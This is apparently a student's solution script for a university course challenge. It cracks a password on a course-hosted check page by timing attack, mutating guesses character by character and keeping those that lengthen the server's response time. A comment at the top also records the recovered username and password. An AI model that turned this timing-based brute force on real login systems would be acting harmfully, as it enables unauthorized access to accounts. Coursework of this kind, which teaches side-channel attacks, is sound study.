# -*- coding: utf-8 -*-
"""
Created on Fri Oct 12 13:08:19 2018

@author: cipher
"""

# Spirit Name: ApricotZebra

# Challenge 3.5: Genetic Algorithm

# Last Edited: 10/17/2018

# sources consulted: 
# 1. for random alphanumeric generator:
    #https://stackoverflow.com/questions/2511222/efficiently-generate-a-16-character-alphanumeric-string/30779367 
# 2. to read webpage contents:
    #https://stackoverflow.com/questions/15138614/how-can-i-read-the-contents-of-an-url-with-python

#------------Result------------    
# username=ApricotZebra
# password=Eteiv8te

import random
import string
import numpy as np
import requests


username = input("Enter your username for CSCI 343: ")
parent = 'AAAAAAAA'
url = 'https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username='+username+'&password='+parent
output = requests.get(url).text
separate = output.split(' ')
initial_time = np.float32(separate[0])
index = 0
offsprings={}
index = [0,1,2,3,4,5,6,7]
   
def randompwd():
    randomchar = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(1)])
    return randomchar

def offspringcheck():
    global output, parent, index, username, offspring, random_index, offsprings, separate
    parent = list(parent)
    random_index = random.choice(index)
    offspring = parent
    offspring[random_index] = randompwd()
    offspring = ''.join(offspring)
    if not offspring in offsprings:
        url = 'https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username='+username+'&password='+offspring
        output = requests.get(url).text
        separate = output.split(' ')


def main():
    global separate, parent, initial_time, output, index, offspring, random_index, offsprings
    
    offspringcheck()
    while (output!= 'SUCCESSFUL'):
        time = np.float32(separate[0])
        offsprings[offspring] = 0 #just to add it to a dictionary of passwords to not repeat 
        if time > initial_time:
            parent = offspring
            index.remove(random_index)
            offspringcheck()
            print(offspring)
            initial_time = time
        elif time <= initial_time:
            print(offspring)
            offspringcheck()
       
    print("\n\nYour password is: " + offspring) 
        
main()


    

            